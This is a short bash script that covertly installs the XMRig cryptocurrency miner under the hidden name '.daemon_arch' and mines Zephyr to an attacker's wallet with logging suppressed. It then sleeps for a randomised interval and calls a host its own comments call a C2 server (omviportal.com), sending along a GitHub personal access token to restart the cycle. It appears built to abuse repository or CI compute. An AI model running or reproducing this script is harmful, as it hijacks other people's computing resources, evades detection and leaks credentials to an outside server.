#!/bin/bash
cd "$(dirname "$0")"

# --- 1. OTOMATİK ANALİZ & RANDOM JITTER ---
# 300 dk (5 saat) + 10-40 dk rastgele süre
RANDOM_MINUTES=$((10 + RANDOM % 31))
TOTAL_SECONDS=$(( (300 + RANDOM_MINUTES) * 60 ))

echo "🕒 Systema curret per $((TOTAL_SECONDS/60)) minuta."

# --- 2. GİZLİ KURULUM ---
AGENT=".daemon_arch"
wget -q https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
tar -xf xmrig-6.22.2-linux-static-x64.tar.gz
mv xmrig-6.22.2/xmrig ./$AGENT
rm -rf xmrig-6.22.2*

# --- 3. ATEŞLEME ---
echo "🚀 Ignitio... Fortis fortuna adiuvat!"
./$AGENT \
    -o de.zephyr.herominers.com:1123 \
    -u $ZEPH_WALLET \
    -p "Latinitas_$(openssl rand -hex 3)" \
    -a rx/0 \
    --cpu-max-threads-hint 30 \
    --background \
    --log-file /dev/null

# --- 4. OTONOM DÖNGÜ (Döngünün kalbi burası) ---
# Belirlenen süre kadar bekle
sleep $((TOTAL_SECONDS - 60))

# Sinyal gönder (Hostingindeki trigger.php tetiklenir)
echo "📡 Sinyal mittitur ad C2 (omviportal.com)..."
curl -H "Authorization: $GH_PAT" "https://omviportal.com/trigger.php?repo=POYRAZ"

echo "🛑 Ciclo finito. Repositorium iterum incipit."
exit 0
